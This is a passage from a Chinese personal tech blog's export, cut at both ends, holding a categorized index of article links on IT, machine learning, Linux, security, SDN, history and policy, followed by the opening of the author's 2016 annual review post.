<li><a href="http://www.jianshu.com/p/ccc8d64c7202">最佳思维利器 OmniGraffle for Mac</a></li>
<li><a href="https://riboseyim.github.io/2016/07/03/Reading/">藏书与阅读</a></li>
<li><a href="https://riboseyim.github.io/2017/07/09/Law-Of-Intellectual-Property/">知识产权法（Intellectual Property）概要</a></li>
<li>待完善<a href="https://riboseyim.github.io/2017/02/13/Master/">Study The Master</a></li>
<li>待完善<a href="https://riboseyim.github.io/2016/04/26/Tools/">工具集</a></li>
</ul>
<h2 id="三、Information-Technology"><a href="#三、Information-Technology" class="headerlink" title="三、Information Technology"></a>三、Information Technology</h2><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/">DevOps 漫谈：从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.github.io/2017/07/05/Law-Of-Engineering/">软件工程实践中的十大法则</a></li>
<li><a href="https://riboseyim.github.io/2017/12/19/Linux-Win-Mac/">谁是王者：macOS vs Linux Kernels ？</a></li>
</ul>
<h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><h4 id="数学-amp-算法"><a href="#数学-amp-算法" class="headerlink" title="数学&amp;算法"></a><a href="https://riboseyim.github.io/2017/06/14/Mathmetics/">数学&amp;算法</a></h4><ul>
<li><a href="https://riboseyim.github.io/2018/03/25/Mathmetics-Complexity/">数学常识|如何度量复杂性</a></li>
<li><a href="https://riboseyim.github.io/2017/08/30/Mathmetics-Beauty/">读书笔记|数学之美（Beauty Of Mathmetics）</a></li>
<li><a href="https://riboseyim.github.io/2017/05/09/Markov_Model/">概率论基础：从马尔可夫模型（Markov Model）到贝叶斯网络</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
</ul>
<h4 id="Machine-Learning"><a href="#Machine-Learning" class="headerlink" title="Machine Learning"></a>Machine Learning</h4><ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li>Priview<a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-Natural-Language/">Machine Learning:自然语言处理技术简报</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-Natural-Language/">经济学人：计算机如何学习人类语言？</a></li>
</ul>
<h4 id="通信协议"><a href="#通信协议" class="headerlink" title="通信协议"></a><a href="https://riboseyim.github.io/2017/05/26/Protocol/">通信协议</a></h4><ul>
<li><a href="https://riboseyim.github.io/2017/05/12/Protocol-RFC/">计算机 RFC 文档</a></li>
<li><a href="https://riboseyim.github.io/2017/05/12/Protocol-TCP/">TCP</a> | <a href="https://riboseyim.github.io/2017/05/12/Protocol-UDP/">UDP</a> | <a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/">gRPC</a></li>
</ul>
<h4 id="开发语言"><a href="#开发语言" class="headerlink" title="开发语言"></a>开发语言</h4><ul>
<li><a href="https://riboseyim.github.io/2017/05/12/Language-Compiler/">Compiler,编译原理</a></li>
<li><p><a href="#">C</a> | <a href="#">Java</a> | <a href="https://riboseyim.github.io/2017/05/16/Language-Perl-lang/">Perl</a> | <a href="https://riboseyim.github.io/2017/05/16/Language-Ruby-lang/">Ruby</a> | <a href="https://riboseyim.github.io/2017/06/19/Language-Python-lang/">Python</a> | <a href="https://riboseyim.github.io/2017/05/16/Language-Node-lang/">Node</a> | <a href="https://riboseyim.github.io/2017/05/16/Language-R-lang/">R</a> | <a href="https://riboseyim.github.io/2017/05/05/Language-Go-lang/">Go</a></p>
</li>
<li><p><a href="https://riboseyim.github.io/2016/05/31/TeamWork-Git/">源代码版本管理：Git</a></p>
</li>
<li><a href="https://riboseyim.github.io/2017/12/21/Language-Auto-Generator/">玩转编程语言:构建自定义代码生成器</a></li>
<li><a href="https://riboseyim.github.io/2016/05/05/OpenSource-Coder/">Coder:代码工具、命名、自动生成及其它技巧</a></li>
<li><a href="https://riboseyim.github.io/2017/07/23/CloudComputing/">Stack Overflow：2017年最赚钱的编程语言</a></li>
</ul>
<h4 id="Linux-操作系统"><a href="#Linux-操作系统" class="headerlink" title="Linux 操作系统"></a><a href="https://riboseyim.github.io/2016/05/28/Linux/">Linux 操作系统</a></h4><ul>
<li><a href="https://riboseyim.github.io/2017/04/26/Linux-Commands/">Linux 常用命令一百条</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单(Netflix版)</a></li>
<li><a href="https://riboseyim.github.io/2017/10/24/Linux-Perf-Picture/">Linux 性能诊断：荐书|《图解性能优化》</a></li>
<li><a href="https://riboseyim.github.io/2017/04/26/Linux-Perf-Master/">Linux 性能诊断：荐书|《Linux Perf Master》</a></li>
<li><a href="https://riboseyim.github.io/2017/10/24/Linux-Perf-Wan/">Linux 性能诊断：Web应用性能优化</a></li>
<li><a href="https://riboseyim.github.io/2016/11/04/OpenSource-Ganglia/">Linux 性能诊断：基于 Ganglia 实现集群性能态势感知</a></li>
<li><a href="https://riboseyim.github.io/2016/11/20/Network-Traffic/">系统系统架构：从珠海航展交通管控实践谈起</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（二）：User Space &amp; RAM</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Works-Memory/">操作系统原理 | How Linux Works（三）：Memory</a></li>
<li><a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.github.io/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
<li><a href="https://riboseyim.github.io/2018/04/27/DevOps-OpenCensus/">DevOps 漫谈：基于OpenCensus构建分布式跟踪系统</a></li>
</ul>
<h4 id="信息安全"><a href="#信息安全" class="headerlink" title="信息安全"></a>信息安全</h4><ul>
<li><a href="https://riboseyim.github.io/2017/05/09/CyberSecurity-Hacker/">Cyber-Security: 黑客与技术、产业及其精神世界</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/10/29/CyberSecurity-WiFi/">Cyber-Security: 警惕 Wi-Fi 漏洞</a></li>
<li><a href="https://riboseyim.github.io/2017/08/31/CyberSecurity-Headers/">Cyber-Security: Web应用安全：攻击、防护和检测</a></li>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2016/10/06/CyberSecurity-SSH/">Cyber-Security: OpenSSH 并不安全</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/CyberSecurity-Trojan/">Cyber-Security: Linux/XOR.DDoS 木马样本分析</a></li>
<li><a href="http://www.jianshu.com/p/670c4d2bb419">Cyber-Security: 事与愿违的后门程序 | Economist</a></li>
<li><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/">Cyber-Security: 美国网络安全立法策略</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security: 香港警务处网络安全与科技罪案调查科</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">Packet Capturing:关于网络数据包的捕获、过滤和分析</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
</ul>
<h4 id="开源技术漫谈"><a href="#开源技术漫谈" class="headerlink" title="开源技术漫谈"></a><a href="https://riboseyim.github.io/2016/04/26/OpenSource/">开源技术漫谈</a></h4><ul>
<li><a href="https://riboseyim.github.io/2016/04/26/Architect/">架构师</a></li>
<li><a href="https://riboseyim.github.io/2016/07/17/OpenSource-StackOverflow/">《Stack Overflow 架构解析 - 2016 Edition》</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/OpenSource-Operational/ß">Linux.com: 引入开源软件的六大运营挑战</a></li>
<li><a href="https://riboseyim.github.io/2017/06/12/OpenSource-Kafka-Microservice/">基于Kafka构建事件溯源型微服务</a></li>
<li><a href="https://riboseyim.github.io/2016/08/15/OpenSource-Kafka/">LinkedIn 开源 Kafka Monitor</a></li>
<li><a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/">基于Go语言快速构建一个RESTful API服务</a></li>
<li><a href="https://riboseyim.github.io/2017/05/24/Log/">应用程序开发中的日志管理(Go语言描述)</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/Technology-Oracle/">最佳工程实践：Oracle 数据库迁移割接实践</a></li>
<li><a href="https://riboseyim.github.io/2018/01/03/OpenSource-DB-PostgreSQL/">开源技术架构漫谈：PostgreSQL 数据库</a></li>
<li><a href="https://riboseyim.github.io/2016/09/01/AAA/">最佳工程实践：基于LVS的AAA负载均衡架构实践</a>  </li>
<li><a href="https://riboseyim.github.io/2016/04/26/OpenSource-ZeroMQ/">开源技术架构漫谈：ZeroMQ</a></li>
</ul>
<h4 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h4><ul>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/BestAppMap/">数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.github.io/2017/05/12/Visualization-GIS/">数据可视化（四）开源地理信息技术简史（Geographic Information System</a></li>
<li><a href="https://riboseyim.github.io/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
<li><a href="https://riboseyim.github.io/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.github.io/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Visualization-DataSource/">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="四、Network-Engineering"><a href="#四、Network-Engineering" class="headerlink" title="四、Network Engineering"></a>四、Network Engineering</h2><ul>
<li><a href="https://riboseyim.github.io/2017/07/14/sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
<li><a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/">远程通信协议：从 CORBA 到 gRPC</a></li>
</ul>
<h4 id="SDN技术指南"><a href="#SDN技术指南" class="headerlink" title="SDN技术指南"></a><a href="https://riboseyim.github.io/2017/05/12/SDN/">SDN技术指南</a></h4><ul>
<li><a href="https://riboseyim.github.io/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.github.io/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）：OpenFlow</a></li>
<li>Preview <a href="https://riboseyim.github.io/2017/10/16/SDN-Controller/">SDN 技术指南（三）：OpenDaylight or Floodlight ?</a></li>
<li><a href="https://riboseyim.github.io/2017/10/13/SDN-OpenvSwitch/">SDN 技术指南（四）：Open vSwitch</a></li>
<li>Preview <a href="#">SDN 技术指南（五）：NFV</a></li>
<li>Preview <a href="#">SDN 技术指南（六）：OpenStack or Kubernetes ? </a></li>
<li><a href="https://riboseyim.github.io/2017/07/23/CloudComputing/">Stack Overflow：云计算平台的趋势分析（AWS or Azure）</a></li>
</ul>
<h2 id="未分类"><a href="#未分类" class="headerlink" title="未分类"></a>未分类</h2><h4 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a><a href="https://riboseyim.github.io/2016/07/28/DevOps/">DevOps</a></h4><ul>
<li><a href="https://riboseyim.github.io/2016/09/24/DevOps-GOPS/">GOPS,高效运维社区</a></li>
<li><a href="https://riboseyim.github.io/2018/03/26/DevOps-Deployment/">DevOps 漫谈：基础设施部署和配置管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/12/DevOps-Container-Usage/">2018 年度 Docker 用户报告 - Sysdig Edition </a></li>
</ul>
<h4 id="SRE"><a href="#SRE" class="headerlink" title="SRE"></a><a href="https://riboseyim.github.io/2017/04/26/SRE/">SRE</a></h4><h4 id="虚拟化"><a href="#虚拟化" class="headerlink" title="虚拟化"></a><a href="https://riboseyim.github.io/2017/05/12/Virtualization/">虚拟化</a></h4><h4 id="TeamWork-关于群体决策"><a href="#TeamWork-关于群体决策" class="headerlink" title="TeamWork,关于群体决策"></a><a href="https://riboseyim.github.io/2016/06/15/TeamWork/">TeamWork,关于群体决策</a></h4><h4 id="TechThinking-关于技术思维"><a href="#TechThinking-关于技术思维" class="headerlink" title="TechThinking,关于技术思维"></a><a href="https://riboseyim.github.io/2017/04/21/TechThinking">TechThinking,关于技术思维</a></h4><h2 id="Nature-amp-Science"><a href="#Nature-amp-Science" class="headerlink" title="Nature&amp;Science"></a>Nature&amp;Science</h2><h4 id="Nature-amp-Science-1"><a href="#Nature-amp-Science-1" class="headerlink" title="Nature&amp;Science"></a><a href="https://riboseyim.github.io/2016/05/02/Science/">Nature&amp;Science</a></h4><h4 id="Catalog-Medicine"><a href="#Catalog-Medicine" class="headerlink" title="Catalog:Medicine"></a><a href="https://riboseyim.github.io/2017/08/15/Medicine/">Catalog:Medicine</a></h4><ul>
<li><p><a href="https://riboseyim.github.io/2017/04/21/Health/">Catalog:Health</a></p>
</li>
<li><p><a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/">嗑药简史（一）：药物成瘾、生活习惯与神经系统</a></p>
</li>
<li><a href="https://riboseyim.github.io/2017/11/06/Addiction-Decision-Fentanyl/">嗑药简史（二）：瘾品跨境流动与外交关系</a></li>
<li><a href="https://riboseyim.github.io/2018/01/07/Addiction-Decision-Law/">嗑药简史（三）：瘾品管制背后的情与法</a></li>
<li><a href="https://riboseyim.github.io/2017/12/20/Addiction-Decision-2016-USA-Students/">嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)</a></li>
<li><a href="https://riboseyim.github.io/2017/07/19/Medicine-Hepar/">医学常识| 肝系统健康状况评价指标体系</a></li>
<li><a href="https://riboseyim.github.io/2018/01/22/Health-Emotional/">医学常识| NIH 情绪健康检查单</a></li>
</ul>
<h4 id="WorldBook-关于知识体系的构建（构思）"><a href="#WorldBook-关于知识体系的构建（构思）" class="headerlink" title="WorldBook:关于知识体系的构建（构思）"></a><a href="https://riboseyim.github.io/2017/05/03/WorldBook/">WorldBook:关于知识体系的构建（构思）</a></h4><h1 id="Economist"><a href="#Economist" class="headerlink" title="Economist"></a>Economist</h1><h4 id="The-Economist"><a href="#The-Economist" class="headerlink" title="The Economist"></a><a href="https://riboseyim.github.io/2016/04/26/Economist/">The Economist</a></h4><ul>
<li><a href="https://riboseyim.github.io/2018/01/30/Economist-Books-Year-2017/">The Economist:Books of the Year 2017</a></li>
<li><a href="https://riboseyim.github.io/2016/12/09/Economist-Books-Year-2016/">Economist:Books of the Year 2016</a></li>
<li><a href="https://riboseyim.github.io/2018/01/07/Policy-Law-Family/">经济学人：加拿大的一夫多妻问题 —— 摩门教、移民和穆斯林</a></li>
<li><a href="https://riboseyim.github.io/2016/12/09/Books/">书单(Economist:《Books of the Year 2016》)</a></li>
<li><a href="https://riboseyim.github.io/2017/04/13/Artistic-Les-Miserables/">经济学人：解读世纪小说《悲惨世界》</a></li>
<li><a href="https://riboseyim.github.io/2017/07/02/Manager/">读书笔记|彼得·德鲁克：管理是一种自由</a></li>
<li><a href="http://www.jianshu.com/p/663ffcd0d2a2">Economist译文:欧洲难民计划：移民危机管理</a></li>
<li><a href="http://www.jianshu.com/p/351bc45763cb">Economist译文:The Saudi blueprint 沙特王国的改革蓝图</a></li>
<li><a href="http://www.jianshu.com/p/9c5f837030e9">Economist译文:2016年全球经济形势预测</a></li>
<li><a href="http://www.jianshu.com/p/d525f1a7fd25">Economist译文:印度电商竞赛</a></li>
<li><a href="http://www.jianshu.com/p/2cfd0b46f1c5">Economist译文:越共换届－巨变或轮回？</a>（201612封禁）</li>
<li><a href="http://www.jianshu.com/p/670c4d2bb419">Economist译文:事与愿违的后门程序</a></li>
<li><a href="http://www.jianshu.com/p/ce638dafe225">Economist译文:当代德国纳粹魅影</a></li>
<li><a href="http://www.jianshu.com/p/f5f55bbe9d57">Economist译文:自由迁徙的障碍</a>（201612封禁）</li>
<li><a href="http://www.jianshu.com/p/18edbb3023f6">Economist译文:奢侈品—万金藏獒</a>（201612封禁）</li>
</ul>
<h2 id="History"><a href="#History" class="headerlink" title="History"></a>History</h2><h4 id="分类：History"><a href="#分类：History" class="headerlink" title="分类：History"></a><a href="https://riboseyim.github.io/2016/05/01/History/">分类：History</a></h4><ul>
<li><a href="https://riboseyim.github.io/2017/04/21/Humanics/">分类：Humanics(人类学)</a></li>
<li><a href="https://riboseyim.github.io/2017/04/20/MrGuZhun/">读书笔记|顾准《顾准日记》</a></li>
</ul>
<h4 id="清史"><a href="#清史" class="headerlink" title="清史"></a><a href="https://riboseyim.github.io/2017/06/24/History-Qing/">清史</a></h4><ul>
<li><a href="#">清史-雍正时期：《大义觉迷录》</a> (通阅,201705)</li>
<li><a href="#">清史-乾隆时期：《叫魂》</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/History-TaipingHeavenly/">清史-嘉道咸时期：史景迁《太平天国》</a></li>
<li><a href="https://riboseyim.github.io/2017/06/24/History-Qing-ZhangJiXing/">清史-嘉道咸时期：张集馨《时晴斋主人自叙年谱》</a></li>
<li><a href="https://riboseyim.github.io/2017/04/20/MrTanSitong/">清史-同治光绪时期：谭嗣同</a></li>
<li><a href="http://www.jianshu.com/p/c43df2f608bb">《国士无双伍连德》</a></li>
</ul>
<h4 id="明史"><a href="#明史" class="headerlink" title="明史"></a><a href="https://riboseyim.github.io/2017/06/25/History-Ming/">明史</a></h4><ul>
<li><a href="http://www.jianshu.com/p/b2bc9871d129">黄仁宇:《万历十五年》</a></li>
<li><a href="http://www.jianshu.com/p/8376f08e6b90">黄仁宇:《放宽历史的视界》</a></li>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/">黄仁宇:《明代的漕运》</a></li>
<li><a href="#">小说《明朝那些事》</a></li>
<li><a href="#">影视作品《大明王朝1956》</a>：政府财政逻辑</li>
<li><a href="https://riboseyim.github.io/2017/06/25/MrLizicheng/">明史：李自成</a></li>
</ul>
<h1 id="Policy-amp-Law"><a href="#Policy-amp-Law" class="headerlink" title="Policy&amp;Law"></a>Policy&amp;Law</h1><h2 id="政府行为模式与预测"><a href="#政府行为模式与预测" class="headerlink" title="政府行为模式与预测"></a><a href="https://riboseyim.github.io/2016/04/26/Policy/">政府行为模式与预测</a></h2><h4 id="专题：公共医疗"><a href="#专题：公共医疗" class="headerlink" title="专题：公共医疗"></a><a href="https://riboseyim.github.io/2017/11/05/Policy-Public-Health/">专题：公共医疗</a></h4><h4 id="专题：公共财政"><a href="#专题：公共财政" class="headerlink" title="专题：公共财政"></a><a href="https://riboseyim.github.io/2017/11/05/Policy-Public-Finance/">专题：公共财政</a></h4><h4 id="专题：贫困问题"><a href="#专题：贫困问题" class="headerlink" title="专题：贫困问题"></a><a href="https://riboseyim.github.io/2017/09/08/Policy-Poverty/">专题：贫困问题</a></h4><h4 id="专题：宗教治理"><a href="#专题：宗教治理" class="headerlink" title="专题：宗教治理"></a><a href="https://riboseyim.github.io/2017/04/21/Policy-Religion/">专题：宗教治理</a></h4><h4 id="专题：民权法"><a href="#专题：民权法" class="headerlink" title="专题：民权法"></a><a href="https://riboseyim.github.io/2017/11/05/Policy-Civil-Rights/">专题：民权法</a></h4><h2 id="法律"><a href="#法律" class="headerlink" title="法律"></a><a href="https://riboseyim.github.io/2016/04/26/Law/">法律</a></h2><h4 id="专题：网络安全法-Cyber-Security"><a href="#专题：网络安全法-Cyber-Security" class="headerlink" title="专题：网络安全法 Cyber-Security"></a><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/">专题：网络安全法 Cyber-Security</a></h4><ul>
<li><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/">美国网络安全立法策略</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CSTCB/">香港网络安全与科技罪案总警司</a></li>
</ul>
<h4 id="专题：知识产权法"><a href="#专题：知识产权法" class="headerlink" title="专题：知识产权法 "></a><a href="https://riboseyim.github.io/2017/07/09/Law-Of-Intellectual-Property/">专题：知识产权法 </a></h4><ul>
<li><a href="https://www.google.com/?tbm=pts&amp;hl=zh-CN">（未完成）基于专利文档的信息检索</a></li>
</ul>
<h4 id="专题：新闻出版法"><a href="#专题：新闻出版法" class="headerlink" title="专题：新闻出版法"></a><a href="https://riboseyim.github.io/2016/07/28/Policy-Publish/">专题：新闻出版法</a></h4><h1 id="Manager"><a href="#Manager" class="headerlink" title="Manager"></a>Manager</h1><ul>
<li><a href="https://riboseyim.github.io/2017/07/02/Manager/">读书笔记|彼得·德鲁克：管理是一种自由</a></li>
</ul>
<h4 id="讲武堂"><a href="#讲武堂" class="headerlink" title="讲武堂"></a><a href="https://riboseyim.github.io/2016/04/26/Commander/">讲武堂</a></h4><ul>
<li><a href="https://riboseyim.github.io/2017/08/15/Commander-Sergeant/">美军士官制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/">美军体能训练观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand/">各国军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/Medal/">美军授勋和嘉奖制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Medal-HK/">太公分猪肉——香港特区授勋和嘉奖制度批判</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-Art-Of-War-Chinese/">中国传统兵法摘要</a></li>
<li><a href="https://riboseyim.github.io/2016/10/15/Artistic-Zhuhai-AirShow/">2016 年珠海航展摄影图辑</a></li>
</ul>
<h2 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h2><ul>
<li><a href="https://riboseyim.github.io/2017/04/20/Travel/">Travel</a></li>
<li><a href="https://riboseyim.github.io/2017/05/12/Museum/">Museum：博物馆大全</a></li>
<li><a href="https://riboseyim.github.io/2017/07/02/BirdWatching-GZ-Wetland/">Birdwatching|广州湿地公园</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/Artistic-Garden/">园林|南京瞻园</a></li>
</ul>
<h2 id="艺术评论"><a href="#艺术评论" class="headerlink" title="艺术评论"></a><a href="https://riboseyim.github.io/2016/05/02/Artistic/">艺术评论</a></h2><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/Artistic-Classical/">古典音乐低俗史</a></li>
<li><a href="https://riboseyim.github.io/2016/09/10/Lincoln/">电影评论 |《灵魂解码《林肯》》</a></li>
<li><a href="https://riboseyim.github.io/2017/04/21/Lincoln-Spielberg/">电影评论 | 斯皮尔伯格的林肯情怀</a></li>
<li><a href="https://riboseyim.github.io/2017/04/20/The-Mad-Phoenix /">舞台剧 |《南海十三郎》幕后故事</a></li>
<li><a href="https://riboseyim.github.io/2017/10/04/Redology-DunMing/">红楼故事：佩刀沽酒作长歌</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/">红楼故事：康熙的秘密情报系统</a></li>
<li><a href="https://mp.weixin.qq.com/cgi-bin/appmsg?begin=0&amp;count=10&amp;t=media/appmsg_list&amp;type=10&amp;action=list_card&amp;lang=zh_CN&amp;token=1371525865">钞票人物：风流小王爷</a></li>
</ul>
]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
  </entry>
  <entry>
    <title>我的2016年度盘点</title>
    <url>/2017/01/01/Check2016/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><span id="more"></span>
<p>This article is part of an <strong>Autobiography</strong> tutorial series. Make sure to check out my other articles as well:</p>
<ul>
<li><a href="https://riboseyim.github.io/2018/12/31/Check2019/">我的 2019 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2018/01/01/Check2018/">我的 2018 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/10/Check2017/">我的 2017 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/01/01/Check2016/">我的 2016 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/28/Check2012/">我的 2012 阅读书单</a></li>
</ul>
<h2 id="2016年度盘点"><a href="#2016年度盘点" class="headerlink" title="2016年度盘点"></a>2016年度盘点</h2><h3 id="一、实践"><a href="#一、实践" class="headerlink" title="一、实践"></a>一、实践</h3><ol>
<li><a href="https://riboseyim.github.io/2016/06/12/Technology-Oracle/">Oracle数据库迁移割接实践</a></li>
<li><a href="https://riboseyim.github.io/2016/09/01/AAA/">基于LVS的AAA负载均衡架构实践</a>  </li>
<li><a href="https://riboseyim.github.io/2016/11/04/OpenSource-Ganglia/">基于Ganglia实现服务集群性能态势感知</a></li>
<li><a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术：Linux喜迎DTrace</a></li>
<li><a href="http://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939328&amp;idx=1&amp;sn=0d70dda90171fd22ac2dbb590a8272b6&amp;scene=21#wechat_redirect">赠书活动</a></li>
<li>社区活动:<br><a href="https://riboseyim.github.io/2016/09/24/GOPS/">GOPS上海站</a><br><a href="http://www.jianshu.com/p/236dd6e22bbb">EGO社群:Commounity Over Code</a><br><a href="http://www.jianshu.com/p/824616ad7575">51CTO企业安全</a><br><a href="https://riboseyim.github.io/2016/07/28/DevOps/">广州DevOps</a></li>
<li>运营工具链<br>1）增加七牛云作为图片存储仓库：提高跨平台移植能力。<br>2）小密圈：简书号第一次被注销（投诉后恢复），警惕。</li>
<li>搬家：两次，思路决定出路，过程优化。</li>
<li>摄影：上海市博物馆特辑（青铜、佛教造像、印章）、2016珠海航展特辑</li>
<li>出版：<a href="https://riboseyim.github.io/2017/10/22/Technology-Writing-Publish/">(探索中)如何出版技术书籍?</a></li>
<li>生活案例：<a href="https://riboseyim.github.io/2016/11/20/Network-Traffic/">性能优化思路：从珠海航展交通管控实践谈起</a></li>
</ol>
<h3 id="二、荣誉"><a href="#二、荣誉" class="headerlink" title="二、荣誉"></a>二、荣誉</h3><ol>
<li><p>高效运维社区|开放运维联盟 <strong>2016年度金牌作者 Writer #Ops 007</strong> <a href="https://mp.weixin.qq.com/s?__biz=MzA4Nzg5Nzc5OA==&amp;mid=2651663680&amp;idx=1&amp;sn=04c1239f098db6310a9b41641d78d03f&amp;chksm=8bcbeee9bcbc67ff89a958340ba78983b85d9975efb462dc89cf6706dedab7f11c53e80cf1c1&amp;scene=0&amp;key=9c48b642bc3f329aca6980052053912927c6d4580b415d7cda29d4054d0dae0b9b32434b23d151bf53866ef530dfcc602c076612c97f498884fa5f5807bdf7194b1848f4e6d8c5e3f062859dcc5c8b23&amp;ascene=0&amp;uin=Mjg2OTA0MDQ4Mg%3D%3D">全部作者</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Writer2016-OPS007.png" alt=""></p>
</li>
</ol>
